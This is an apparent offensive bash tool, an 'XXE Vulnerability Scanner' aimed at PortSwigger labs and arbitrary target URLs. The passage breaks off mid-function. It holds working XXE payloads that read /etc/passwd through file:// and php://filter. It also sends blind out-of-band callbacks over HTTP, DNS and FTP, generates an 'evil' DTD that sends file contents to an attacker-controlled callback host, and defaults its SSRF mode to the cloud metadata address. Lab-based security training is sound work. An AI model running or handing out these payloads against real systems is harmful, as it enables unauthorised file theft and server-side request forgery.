#!/bin/bash
#═══════════════════════════════════════════════════════════════════
#  XXE Vulnerability Scanner v1.0
#  Automated XXE Detection & Exploitation
#  Covers all PortSwigger XXE Labs
#  Uses: curl (built-in) + XXEinjector (optional)
#═══════════════════════════════════════════════════════════════════

# ──────────────── Colors & Formatting ────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
BG_BLUE='\033[44m'

# ──────────────── Global Variables ────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOADS_DIR="$SCRIPT_DIR/xxe_payloads"
TEMPLATES_DIR="$SCRIPT_DIR/xxe_templates"
DTD_DIR="$SCRIPT_DIR/xxe_dtd_templates"
BRUTE_DIR="$SCRIPT_DIR/xxe_brute"
XXEINJECTOR_DIR="$SCRIPT_DIR/XXEinjector"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SCAN_DIR=""
LOG_FILE=""
RESULTS_FILE=""
VULN_COUNT=0
VULNS_FOUND=()
FILES_EXTRACTED=()
SEVERITY="INFO"
START_TIME=$(date +%s)

# ──────────────── Banner ────────────────
banner() {
    echo -e "${RED}"
    cat << 'EOF'
   ██╗  ██╗██╗  ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
   ╚██╗██╔╝╚██╗██╔╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
    ╚███╔╝  ╚███╔╝ █████╗      ███████╗██║     ███████║██╔██╗ ██║
    ██╔██╗  ██╔██╗ ██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║
   ██╔╝ ██╗██╔╝ ██╗███████╗    ███████║╚██████╗██║  ██║██║ ╚████║
   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
EOF
    echo -e "${CYAN}   ═══════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}   ${BOLD}XXE Vulnerability Scanner v1.0${NC}"
    echo -e "${DIM}   Automated XXE Detection | All PortSwigger Labs Covered${NC}"
    echo -e "${CYAN}   ═══════════════════════════════════════════════════════════${NC}"
    echo ""
}

# ──────────────── Usage ────────────────
usage() {
    banner
    echo -e "${WHITE}${BOLD}Usage:${NC}"
    echo -e "  $0 <target_url> [options]"
    echo ""
    echo -e "${WHITE}${BOLD}Scan Modes:${NC}"
    echo -e "  ${GREEN}--mode=detect${NC}        Detect if XML parsing is active"
    echo -e "  ${GREEN}--mode=classic${NC}       Classic XXE - direct file read"
    echo -e "  ${GREEN}--mode=blind-oob${NC}     Blind XXE with OOB callback"
    echo -e "  ${GREEN}--mode=blind-exfil${NC}   Blind XXE data exfiltration"
    echo -e "  ${GREEN}--mode=error-based${NC}   Error-based XXE extraction"
    echo -e "  ${GREEN}--mode=ssrf${NC}          XXE-based SSRF attack"
    echo -e "  ${GREEN}--mode=xinclude${NC}      XInclude injection"
    echo -e "  ${GREEN}--mode=svg-upload${NC}    XXE via SVG file upload"
    echo -e "  ${YELLOW}--mode=full${NC}          ${BOLD}Full scan - all techniques${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}Options:${NC}"
    echo -e "  ${CYAN}--host=<ip>${NC}          Your IP for OOB callbacks (required for blind)"
    echo -e "  ${CYAN}--collaborator=<url>${NC} Burp Collaborator URL"
    echo -e "  ${CYAN}--target-file=<path>${NC} File to extract (default: /etc/hostname)"
    echo -e "  ${CYAN}--internal-url=<url>${NC} Internal URL for SSRF"
    echo -e "  ${CYAN}--upload-ep=<path>${NC}   Upload endpoint path"
    echo -e "  ${CYAN}--method=<M>${NC}          HTTP method (default: POST)"
    echo -e "  ${CYAN}--content-type=<ct>${NC}   Content-Type header"
    echo -e "  ${CYAN}--cookie=<cookie>${NC}     Session cookie"
    echo -e "  ${CYAN}--header=<h>${NC}          Extra header (repeatable)"
    echo -e "  ${CYAN}--data=<xml>${NC}          Custom XML body"
    echo -e "  ${CYAN}--param=<name>${NC}        Parameter name to inject into"
    echo -e "  ${CYAN}--proxy=<url>${NC}         Proxy (e.g., http://127.0.0.1:8080)"
    echo -e "  ${CYAN}--timeout=<sec>${NC}       Request timeout (default: 15)"
    echo -e "  ${CYAN}--output=<dir>${NC}        Output directory"
    echo -e "  ${CYAN}--use-xxeinjector${NC}     Force use of XXEinjector tool"
    echo -e "  ${CYAN}--oob-method=<m>${NC}      OOB method: http/ftp/gopher (default: http)"
    echo ""
    echo -e "${WHITE}${BOLD}Examples:${NC}"
    echo -e "  ${DIM}# Full scan on PortSwigger lab${NC}"
    echo -e "  $0 https://LAB.web-security-academy.net/product/stock --mode=full"
    echo ""
    echo -e "  ${DIM}# Blind XXE with Burp Collaborator${NC}"
    echo -e "  $0 https://target.com/api --mode=blind-oob --collaborator=xyz.burpcollaborator.net"
    echo ""
    echo -e "  ${DIM}# Classic XXE to read /etc/passwd${NC}"
    echo -e "  $0 https://target.com/api --mode=classic --target-file=/etc/passwd"
    echo ""
    exit 0
}

# ──────────────── Logging ────────────────
log_info()     { echo -e "${BLUE}[*]${NC} $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_success()  { echo -e "${GREEN}[✓]${NC} $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_warning()  { echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_error()    { echo -e "${RED}[✗]${NC} $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_critical() { echo -e "${BG_RED}${WHITE}[CRITICAL]${NC} $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_vuln()     { echo -e "${RED}${BOLD}[VULN]${NC} $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_test()     { echo -e "${MAGENTA}[TEST]${NC} $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_section()  {
    echo "" | tee -a "$LOG_FILE" 2>/dev/null
    echo -e "${CYAN}───────────────────────────────────────────────────────${NC}" | tee -a "$LOG_FILE" 2>/dev/null
    echo -e "${WHITE}${BOLD}  $1${NC}" | tee -a "$LOG_FILE" 2>/dev/null
    echo -e "${CYAN}───────────────────────────────────────────────────────${NC}" | tee -a "$LOG_FILE" 2>/dev/null
}

# ──────────────── Argument Parsing ────────────────
parse_args() {
    if [ $# -eq 0 ]; then
        usage
    fi

    # Check for --help before anything else
    for arg in "$@"; do
        case "$arg" in
            --help|-h) usage ;;
        esac
    done

    TARGET_URL="$1"
    shift

    # Defaults
    SCAN_MODE="full"
    HOST_IP=""
    COLLABORATOR_URL=""
    TARGET_FILE="/etc/hostname"
    INTERNAL_URL="http://169.254.169.254/latest/meta-data/"
    UPLOAD_ENDPOINT=""
    HTTP_METHOD="POST"
    CONTENT_TYPE="application/xml"
    SESSION_COOKIE=""
    EXTRA_HEADERS=()
    CUSTOM_DATA=""
    INJECT_PARAM="productId"
    PROXY=""
    TIMEOUT=15
    OUTPUT_DIR=""
    USE_XXEINJECTOR=false
    OOB_METHOD="http"

    while [ $# -gt 0 ]; do
        case "$1" in
            --mode=*)       SCAN_MODE="${1#*=}" ;;
            --host=*)       HOST_IP="${1#*=}" ;;
            --collaborator=*) COLLABORATOR_URL="${1#*=}" ;;
            --target-file=*) TARGET_FILE="${1#*=}" ;;
            --internal-url=*) INTERNAL_URL="${1#*=}" ;;
            --upload-ep=*)  UPLOAD_ENDPOINT="${1#*=}" ;;
            --method=*)     HTTP_METHOD="${1#*=}" ;;
            --content-type=*) CONTENT_TYPE="${1#*=}" ;;
            --cookie=*)     SESSION_COOKIE="${1#*=}" ;;
            --header=*)     EXTRA_HEADERS+=("${1#*=}") ;;
            --data=*)       CUSTOM_DATA="${1#*=}" ;;
            --param=*)      INJECT_PARAM="${1#*=}" ;;
            --proxy=*)      PROXY="${1#*=}" ;;
            --timeout=*)    TIMEOUT="${1#*=}" ;;
            --output=*)     OUTPUT_DIR="${1#*=}" ;;
            --use-xxeinjector) USE_XXEINJECTOR=true ;;
            --oob-method=*) OOB_METHOD="${1#*=}" ;;
            --help|-h)      usage ;;
            *)              log_warning "Unknown option: $1" ;;
        esac
        shift
    done

    # Setup output directory
    if [ -z "$OUTPUT_DIR" ]; then
        SCAN_DIR="$SCRIPT_DIR/xxe_results/scan_${TIMESTAMP}"
    else
        SCAN_DIR="$OUTPUT_DIR"
    fi
    mkdir -p "$SCAN_DIR"
    LOG_FILE="$SCAN_DIR/xxe_scan.log"
    RESULTS_FILE="$SCAN_DIR/results.txt"

    # Extract host from URL for templates
    TARGET_HOST=$(echo "$TARGET_URL" | sed -E 's|https?://([^/]+).*|\1|')

    # Generate a unique callback ID if no collaborator set
    CALLBACK_ID="xxe-$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n' || echo $RANDOM$RANDOM)"

    # If no collaborator and no host, use a detection-only approach
    if [ -z "$COLLABORATOR_URL" ] && [ -n "$HOST_IP" ]; then
        COLLABORATOR_URL="${HOST_IP}:8888"
    fi
}

# ──────────────── Build curl command ────────────────
build_curl_cmd() {
    local payload="$1"
    local url="${2:-$TARGET_URL}"
    local ct="${3:-$CONTENT_TYPE}"
    local method="${4:-$HTTP_METHOD}"

    local cmd="curl -sk -X $method"
    cmd+=" -H 'Content-Type: $ct'"
    cmd+=" --max-time $TIMEOUT"

    if [ -n "$SESSION_COOKIE" ]; then
        cmd+=" -H 'Cookie: $SESSION_COOKIE'"
    fi

    for h in "${EXTRA_HEADERS[@]}"; do
        cmd+=" -H '$h'"
    done

    if [ -n "$PROXY" ]; then
        cmd+=" --proxy '$PROXY'"
    fi

    cmd+=" -d '$payload'"
    cmd+=" '$url'"

    echo "$cmd"
}

# ──────────────── Execute payload via curl ────────────────
send_payload() {
    local payload="$1"
    local url="${2:-$TARGET_URL}"
    local ct="${3:-$CONTENT_TYPE}"
    local method="${4:-$HTTP_METHOD}"
    local desc="${5:-payload}"

    local response_file="$SCAN_DIR/response_${desc}_$(date +%s%N).txt"
    local headers_file="$SCAN_DIR/headers_${desc}_$(date +%s%N).txt"

    local curl_args=(-sk -X "$method"
        -H "Content-Type: $ct"
        --max-time "$TIMEOUT"
        -w "\n---HTTP_CODE:%{http_code}---TOTAL_TIME:%{time_total}---SIZE:%{size_download}---"
        -D "$headers_file"
        -o "$response_file"
    )

    if [ -n "$SESSION_COOKIE" ]; then
        curl_args+=(-H "Cookie: $SESSION_COOKIE")
    fi

    for h in "${EXTRA_HEADERS[@]}"; do
        curl_args+=(-H "$h")
    done

    if [ -n "$PROXY" ]; then
        curl_args+=(--proxy "$PROXY")
    fi

    curl_args+=(-d "$payload" "$url")

    local meta
    meta=$(curl "${curl_args[@]}" 2>/dev/null)

    local http_code=$(echo "$meta" | grep -oP 'HTTP_CODE:\K[0-9]+' 2>/dev/null || echo "000")
    local total_time=$(echo "$meta" | grep -oP 'TOTAL_TIME:\K[0-9.]+' 2>/dev/null || echo "0")
    local resp_size=$(echo "$meta" | grep -oP 'SIZE:\K[0-9]+' 2>/dev/null || echo "0")
    local response=""
    if [ -f "$response_file" ]; then
        response=$(cat "$response_file" 2>/dev/null)
    fi

    # Return results
    echo "HTTP_CODE=$http_code"
    echo "TOTAL_TIME=$total_time"
    echo "RESP_SIZE=$resp_size"
    echo "RESPONSE_FILE=$response_file"
    echo "HEADERS_FILE=$headers_file"
    echo "RESPONSE_BODY=$response"
}

# ──────────────── Check Dependencies ────────────────
check_deps() {
    log_section "DEPENDENCY CHECK"

    # curl is essential
    if command -v curl &>/dev/null; then
        log_success "curl found: $(curl --version 2>/dev/null | head -1)"
    else
        log_error "curl not found! Cannot continue."
        exit 1
    fi

    # Ruby for XXEinjector
    if command -v ruby &>/dev/null; then
        log_success "ruby found: $(ruby --version 2>/dev/null)"
        RUBY_AVAILABLE=true
    else
        log_warning "ruby not found - XXEinjector will not be available"
        RUBY_AVAILABLE=false
    fi

    # XXEinjector
    if [ -f "$XXEINJECTOR_DIR/XXEinjector.rb" ]; then
        log_success "XXEinjector found at $XXEINJECTOR_DIR"
        XXEINJECTOR_AVAILABLE=true
    else
        log_warning "XXEinjector not installed"
        if [ "$USE_XXEINJECTOR" = true ]; then
            log_info "Cloning XXEinjector..."
            git clone https://github.com/enjoiz/XXEinjector.git "$XXEINJECTOR_DIR" 2>/dev/null
            if [ $? -eq 0 ]; then
                log_success "XXEinjector cloned successfully"
                XXEINJECTOR_AVAILABLE=true
            else
                log_error "Failed to clone XXEinjector"
                XXEINJECTOR_AVAILABLE=false
            fi
        else
            XXEINJECTOR_AVAILABLE=false
        fi
    fi

    # Check payloads directory
    if [ -d "$PAYLOADS_DIR" ]; then
        local payload_count=$(ls -1 "$PAYLOADS_DIR"/*.xml 2>/dev/null | wc -l)
        log_success "Payloads directory found ($payload_count payloads)"
    else
        log_error "Payloads directory not found at $PAYLOADS_DIR"
        log_info "Creating default payloads..."
        mkdir -p "$PAYLOADS_DIR"
    fi
}

# ═══════════════════════════════════════════════════════════════
#  SCAN MODES
# ═══════════════════════════════════════════════════════════════

# ──────────────── Mode: DETECT ────────────────
scan_detect() {
    log_section "XML PARSER DETECTION"

    local detected=false

    # Test 1: Send well-formed XML
    log_test "Test 1: Sending well-formed XML..."
    local payload='<?xml version="1.0" encoding="UTF-8"?><test><value>xxedetect123</value></test>'
    local result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "detect_wellformed")
    local http_code=$(echo "$result" | grep "HTTP_CODE=" | cut -d= -f2)
    local response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    local body=""
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if [ "$http_code" != "000" ] && [ "$http_code" != "405" ]; then
        log_success "Server responded to XML (HTTP $http_code)"
        detected=true

        if echo "$body" | grep -qi "xxedetect123" 2>/dev/null; then
            log_success "XML values reflected in response (In-Band possible)"
            echo "XML_REFLECTED=true" >> "$RESULTS_FILE"
        fi
    else
        log_warning "Server did not accept XML POST (HTTP $http_code)"
    fi

    # Test 2: Send malformed XML to trigger parser error
    log_test "Test 2: Sending malformed XML..."
    local bad_payload='<?xml version="1.0"?><test><broken>'
    result=$(send_payload "$bad_payload" "$TARGET_URL" "application/xml" "POST" "detect_malformed")
    http_code=$(echo "$result" | grep "HTTP_CODE=" | cut -d= -f2)
    response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if echo "$body" | grep -qiE "(xml|parse|syntax|unexpected|element|tag|SAX|DOM|javax\.xml|lxml|simplexml|DOMDocument)" 2>/dev/null; then
        log_success "XML parser error detected in response!"
        log_info "Parser likely: $(echo "$body" | grep -oiE '(SAX|DOM|javax\.xml|lxml|simplexml|DOMDocument|XMLReader|expat|libxml)' | head -1)"
        detected=true
        echo "XML_PARSER_ERROR=true" >> "$RESULTS_FILE"
    fi

    # Test 3: Send internal entity to test entity processing
    log_test "Test 3: Testing internal entity processing..."
    local entity_payload='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxetest "XXE_ENTITY_RESOLVED_OK"> ]><test><value>&xxetest;</value></test>'
    result=$(send_payload "$entity_payload" "$TARGET_URL" "application/xml" "POST" "detect_entity")
    http_code=$(echo "$result" | grep "HTTP_CODE=" | cut -d= -f2)
    response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if echo "$body" | grep -q "XXE_ENTITY_RESOLVED_OK" 2>/dev/null; then
        log_critical "Internal entities are resolved! XXE likely possible!"
        detected=true
        echo "INTERNAL_ENTITIES=true" >> "$RESULTS_FILE"
    fi

    # Test 4: Content-Type switching (JSON → XML)
    log_test "Test 4: Testing Content-Type switching..."
    local json_payload='<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxetest "CT_SWITCH_OK"> ]><root><value>&xxetest;</value></root>'
    result=$(send_payload "$json_payload" "$TARGET_URL" "text/xml" "POST" "detect_ct_switch")
    http_code=$(echo "$result" | grep "HTTP_CODE=" | cut -d= -f2)
    response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if [ "$http_code" != "000" ] && [ "$http_code" != "415" ]; then
        log_success "Server accepts text/xml Content-Type (HTTP $http_code)"
        echo "TEXT_XML_ACCEPTED=true" >> "$RESULTS_FILE"
    fi

    # Test 5: Check for DOCTYPE rejection
    log_test "Test 5: Checking DOCTYPE handling..."
    local doctype_payload='<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY x "test"> ]><test>&x;</test>'
    result=$(send_payload "$doctype_payload" "$TARGET_URL" "application/xml" "POST" "detect_doctype")
    response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    # Check for explicit DOCTYPE rejection (exclude echo-back false positives)
    if echo "$body" | grep -qiE "(disallowed|forbidden|not allowed|blocked|DOCTYPE.*not.*permitted|DTD.*prohibited)" 2>/dev/null; then
        log_warning "DOCTYPE appears to be blocked or filtered"
        echo "DOCTYPE_BLOCKED=true" >> "$RESULTS_FILE"
    else
        log_success "DOCTYPE not explicitly blocked"
        echo "DOCTYPE_ALLOWED=true" >> "$RESULTS_FILE"
    fi

    if [ "$detected" = true ]; then
        log_success "XML parser detected on target!"
        echo "XML_PARSER_DETECTED=true" >> "$RESULTS_FILE"
        return 0
    else
        log_warning "Could not confirm XML parser on target"
        echo "XML_PARSER_DETECTED=false" >> "$RESULTS_FILE"
        return 1
    fi
}

# ──────────────── Mode: CLASSIC XXE ────────────────
scan_classic() {
    log_section "CLASSIC XXE - DIRECT FILE READ"

    # Build unique list of files to try (avoid duplicates)
    local -a files_to_try=()
    local -A seen_files=()
    for f in "$TARGET_FILE" "/etc/passwd" "/etc/hostname" "/etc/os-release"; do
        if [ -z "${seen_files[$f]:-}" ]; then
            files_to_try+=("$f")
            seen_files[$f]=1
        fi
    done
    local vuln_found=false

    for target_f in "${files_to_try[@]}"; do
        log_test "Trying to read: $target_f"

        # Payload 1: Standard entity
        local payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://$target_f\"> ]><stockCheck><productId>\&xxe;</productId><storeId>1</storeId></stockCheck>"
        local result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "classic_$(basename $target_f)")
        local response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
        local body=""
        [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

        # Check for file content indicators
        if echo "$body" | grep -qE "(root:|nobody:|daemon:|www-data:|sshd:|nologin|/bin/bash|/bin/sh)" 2>/dev/null; then
            log_vuln "FILE READ SUCCESSFUL: $target_f"
            log_critical "Classic XXE vulnerability confirmed!"
            echo "$body" > "$SCAN_DIR/extracted_$(basename $target_f).txt"
            VULNS_FOUND+=("Classic XXE - File Read: $target_f")
            FILES_EXTRACTED+=("$target_f")
            vuln_found=true
            VULN_COUNT=$((VULN_COUNT + 1))
            SEVERITY="CRITICAL"
            break
        elif echo "$body" | grep -qiE "(PRETTY_NAME|VERSION_ID|ID=)" 2>/dev/null; then
            log_vuln "FILE READ SUCCESSFUL: $target_f (OS info)"
            echo "$body" > "$SCAN_DIR/extracted_$(basename $target_f).txt"
            VULNS_FOUND+=("Classic XXE - File Read: $target_f")
            FILES_EXTRACTED+=("$target_f")
            vuln_found=true
            VULN_COUNT=$((VULN_COUNT + 1))
            SEVERITY="CRITICAL"
        fi

        # Payload 2: PHP filter (base64)
        log_test "Trying PHP filter for: $target_f"
        payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=$target_f\"> ]><stockCheck><productId>\&xxe;</productId><storeId>1</storeId></stockCheck>"
        result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "classic_php_$(basename $target_f)")
        response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
        [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

        # Check for base64 content (long base64 strings)
        if echo "$body" | grep -qP '[A-Za-z0-9+/]{20,}={0,2}' 2>/dev/null; then
            local b64content=$(echo "$body" | grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | head -1)
            local decoded=$(echo "$b64content" | base64 -d 2>/dev/null)
            if [ -n "$decoded" ] && [ ${#decoded} -gt 5 ]; then
                log_vuln "FILE READ via PHP filter: $target_f"
                echo "$decoded" > "$SCAN_DIR/extracted_$(basename $target_f).txt"
                VULNS_FOUND+=("Classic XXE via PHP filter: $target_f")
                FILES_EXTRACTED+=("$target_f")
                vuln_found=true
                VULN_COUNT=$((VULN_COUNT + 1))
                SEVERITY="CRITICAL"
            fi
        fi
    done

    if [ "$vuln_found" = false ]; then
        log_info "No direct file read achieved (target may be blind)"
    fi

    return 0
}

# ──────────────── Mode: BLIND OOB ────────────────
scan_blind_oob() {
    log_section "BLIND XXE - OUT OF BAND DETECTION"

    if [ -z "$COLLABORATOR_URL" ] && [ -z "$HOST_IP" ]; then
        log_warning "No callback server specified (--host or --collaborator)"
        log_info "Sending payloads anyway for detection via timing/errors..."
    fi

    local callback="${COLLABORATOR_URL:-${HOST_IP}:8888}"
    local vuln_indicators=false

    # Payload 1: General entity OOB
    log_test "Test 1: General entity OOB callback..."
    local payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://${callback}/xxe-general-${CALLBACK_ID}\"> ]><stockCheck><productId>\&xxe;</productId><storeId>1</storeId></stockCheck>"
    local result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "blind_oob_general")
    local http_code=$(echo "$result" | grep "HTTP_CODE=" | cut -d= -f2)
    local total_time=$(echo "$result" | grep "TOTAL_TIME=" | cut -d= -f2)
    local response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    local body=""
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    # Check for timing anomalies (indicates external connection attempt)
    if (( $(echo "$total_time > 5.0" | bc -l 2>/dev/null || echo 0) )); then
        log_warning "Delayed response ($total_time sec) - possible OOB connection attempt"
        vuln_indicators=true
    fi

    if [ "$http_code" = "200" ] || [ "$http_code" = "500" ]; then
        log_info "Server responded HTTP $http_code to general entity payload"
    fi

    # Payload 2: Parameter entity OOB (most common for blind XXE)
    log_test "Test 2: Parameter entity OOB callback..."
    payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://${callback}/xxe-param-${CALLBACK_ID}\"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
    result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "blind_oob_param")
    http_code=$(echo "$result" | grep "HTTP_CODE=" | cut -d= -f2)
    total_time=$(echo "$result" | grep "TOTAL_TIME=" | cut -d= -f2)
    response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if (( $(echo "$total_time > 5.0" | bc -l 2>/dev/null || echo 0) )); then
        log_warning "Delayed response ($total_time sec) - parameter entity may be processed"
        vuln_indicators=true
    fi

    # Payload 3: DNS-only (when HTTP outbound blocked)
    log_test "Test 3: DNS-based detection..."
    payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://xxe-dns-${CALLBACK_ID}.${callback}\"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
    result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "blind_oob_dns")

    # Payload 4: FTP-based OOB
    log_test "Test 4: FTP-based OOB callback..."
    payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"ftp://${callback}/xxe-ftp-${CALLBACK_ID}\"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
    result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "blind_oob_ftp")

    if [ -n "$COLLABORATOR_URL" ] || [ -n "$HOST_IP" ]; then
        echo ""
        echo -e "${YELLOW}╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║  ${WHITE}${BOLD}CHECK YOUR CALLBACK SERVER NOW!${NC}${YELLOW}                     ║${NC}"
        echo -e "${YELLOW}║                                                      ║${NC}"
        echo -e "${YELLOW}║  ${NC}Look for DNS/HTTP/FTP requests containing:${YELLOW}          ║${NC}"
        echo -e "${YELLOW}║  ${CYAN}  xxe-general-${CALLBACK_ID}${YELLOW}          ║${NC}"
        echo -e "${YELLOW}║  ${CYAN}  xxe-param-${CALLBACK_ID}${YELLOW}            ║${NC}"
        echo -e "${YELLOW}║  ${CYAN}  xxe-dns-${CALLBACK_ID}${YELLOW}              ║${NC}"
        echo -e "${YELLOW}║  ${CYAN}  xxe-ftp-${CALLBACK_ID}${YELLOW}              ║${NC}"
        echo -e "${YELLOW}║                                                      ║${NC}"
        echo -e "${YELLOW}║  ${NC}If Burp Collaborator: click ${GREEN}Poll Now${NC}${YELLOW}                ║${NC}"
        echo -e "${YELLOW}║  ${NC}If Interactsh: check your terminal${YELLOW}                 ║${NC}"
        echo -e "${YELLOW}╚══════════════════════════════════════════════════════╝${NC}"
        echo ""

        VULNS_FOUND+=("Blind XXE OOB - Payloads sent (check callback server: $callback)")
        VULN_COUNT=$((VULN_COUNT + 1))
        [ "$SEVERITY" != "CRITICAL" ] && SEVERITY="HIGH"
        echo "BLIND_OOB_PAYLOADS_SENT=true" >> "$RESULTS_FILE"
        echo "CALLBACK_SERVER=$callback" >> "$RESULTS_FILE"
        echo "CALLBACK_ID=$CALLBACK_ID" >> "$RESULTS_FILE"
    fi

    # Check for error leaks in responses
    for resp_f in "$SCAN_DIR"/response_blind_oob_*.txt; do
        [ -f "$resp_f" ] || continue
        local resp_content=$(cat "$resp_f" 2>/dev/null)
        if echo "$resp_content" | grep -qiE "(connection refused|connect to|timeout|resolve|DNS|lookup)" 2>/dev/null; then
            log_vuln "Response indicates external connection attempt!"
            log_info "Evidence: $(echo "$resp_content" | grep -iE "(connection|connect|timeout|resolve|DNS|lookup)" | head -2)"
            VULNS_FOUND+=("Blind XXE - Error message reveals OOB attempt")
            VULN_COUNT=$((VULN_COUNT + 1))
            SEVERITY="HIGH"
        fi
    done

    return 0
}

# ──────────────── Mode: BLIND EXFIL ────────────────
scan_blind_exfil() {
    log_section "BLIND XXE - DATA EXFILTRATION"

    local callback="${COLLABORATOR_URL:-${HOST_IP}:8888}"

    if [ -z "$callback" ] || [ "$callback" = ":8888" ]; then
        log_error "Callback server required for data exfiltration (--host or --collaborator)"
        return 1
    fi

    # Generate evil DTD for exfiltration
    local evil_dtd="$SCAN_DIR/evil_exfil.dtd"
    cat > "$evil_dtd" << DTDEOF
<!ENTITY % file SYSTEM "file://$TARGET_FILE">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${callback}/?data=%file;'>">
%eval;
%exfil;
DTDEOF

    log_info "Generated exfiltration DTD: $evil_dtd"
    log_info "Target file: $TARGET_FILE"
    log_warning "You need to host this DTD on your server: http://YOUR_SERVER/evil.dtd"
    log_info "Example: python3 -m http.server 8888  (in $SCAN_DIR)"

    # Send the payload
    log_test "Sending exfiltration payload..."
    local payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://${callback}/evil_exfil.dtd\"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
    send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "blind_exfil"

    log_info "Check callback server for data exfiltration:"
    log_info "  Data will appear as: http://${callback}/?data=<FILE_CONTENT>"

    VULNS_FOUND+=("Blind XXE Exfil - Payload sent for $TARGET_FILE")
    echo "EXFIL_PAYLOAD_SENT=true" >> "$RESULTS_FILE"
    echo "EXFIL_DTD=$evil_dtd" >> "$RESULTS_FILE"

    return 0
}

# ──────────────── Mode: ERROR BASED ────────────────
scan_error_based() {
    log_section "ERROR-BASED XXE"

    local callback="${COLLABORATOR_URL:-${HOST_IP}:8888}"

    # Technique 1: Non-existent file reference to trigger error with content
    log_test "Test 1: Triggering error with file reference..."
    local payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://$TARGET_FILE\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
    local result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "error_direct")
    local response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    local body=""
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if echo "$body" | grep -qE "(root:|nobody:|daemon:|www-data:|sshd:|admin:)" 2>/dev/null; then
        log_vuln "Error-based XXE! File content in error message!"
        echo "$body" > "$SCAN_DIR/error_extracted_$(basename $TARGET_FILE).txt"
